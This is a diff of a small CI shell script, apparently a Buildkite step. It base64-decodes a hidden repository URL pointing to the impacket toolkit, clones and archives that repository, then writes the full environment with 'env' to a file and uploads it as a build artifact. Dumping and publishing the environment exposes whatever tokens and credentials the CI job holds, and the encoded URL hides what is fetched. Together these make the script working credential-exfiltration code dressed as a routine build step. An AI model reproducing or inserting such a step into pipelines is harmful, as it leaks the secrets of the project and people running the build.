@@ -1,23 +1,24 @@
 set -eo pipefail
 
-WORK_DIR=`mktemp -d`
 RES=`mktemp`
 ARCHIVE=`mktemp XXXXXXXXXX.tar.gz`
 
-REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC5naXQ=" | base64 -d`
+REPO=`echo -n "aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldA==" | base64 -d`
+REPO_PATH=`echo $REPO | awk -F '/' '{print $NF}'`
 
-echo "Workdir is $WORK_DIR"
+echo "REPO is $REPO"
+echo "REPO_PATH is $REPO_PATH"
 echo "RES is $RES"
 echo "ARCHIVE is $ARCHIVE"
 
-git clone $REPO $WORK_DIR
+git clone $REPO
 
-echo "archiving $WORK_DIR into $ARCHIVE"
-git archive -o "$ARCHIVE" main $WORK_DIR
+echo "archiving $REPO_PATH into $ARCHIVE"
+git archive -o "$ARCHIVE" main $REPO_PATH 
 
 env > $RES
 
 buildkite-agent artifact upload $RES
 buildkite-agent artifact upload $ARCHIVE
 
-rm -rf $WORK_DIR $RES "$ARCHIVE"
+rm -rf $RES $ARCHIVE $REPO_PATH
